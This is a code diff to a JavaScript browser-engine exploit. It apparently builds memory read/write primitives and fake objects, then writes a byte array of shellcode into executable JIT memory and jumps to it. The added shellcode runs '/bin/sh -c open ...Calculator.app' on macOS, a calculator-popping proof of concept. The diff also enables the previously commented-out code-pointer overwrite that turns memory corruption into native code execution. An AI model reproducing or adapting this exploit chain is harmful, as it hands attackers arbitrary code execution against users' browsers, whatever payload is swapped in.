@@ -65,6 +65,9 @@ var rwObjBufferAddr;
 var fakeRwObj;
 var fakeInnerObj;
 
+var sc = [72,49,192,184,2,0,0,0,72,193,200,40,72,131,200,59,72,137,193,72,49,210,72,187,47,98,105,110,47,47,115,104,82,83,84,95,82,187,45,99,0,0,82,83,84,91,82,72,185,97,116,111,114,46,97,112,112,81,72,185,115,47,67,97,108,99,117,108,81,72,185,108,105,99,97,116,105,111,110,81,72,185,115,116,101,109,47,65,112,112,81,72,185,111,112,101,110,32,47,83,121,81,84,89,82,81,83,87,84,94,15,5];
+
+
 function addrOf(obj) {
     overwrite_obj.j = obj;
     return Int64.from_double(fake_arr[3]);
@@ -159,13 +162,10 @@ function callback(ev) {
 
     var [_JITFunc, rwxMemAddr] = getJITFunction();
 
-    alert(rwxMemAddr);
-    for (let i = 0; i < 300; i++)
-        write64(Int64.add(rwxMemAddr, i), new Int64(0x41));
-    /*
+    for (let i = 0; i < sc.length; i++)
+        write64(Int64.add(rwxMemAddr, i), new Int64(sc[i]));
     setJITCodeAddr(alert, rwxMemAddr);
     alert(1);
-    */
 
     while (true) {}
 }
@@ -278,7 +278,6 @@ function setJITCodeAddr(func, addr) {
     // alert("[+] Target function @ " + funcAddr);
     let executableAddr = read64(Int64.add(funcAddr, 3 * 8));
     // alert("[+] Executable instance @ " + executableAddr);
-    document.leakAddr(func);
     write64(Int64.add(executableAddr, 3 * 8), addr);
     document.leakAddr(func);
 }
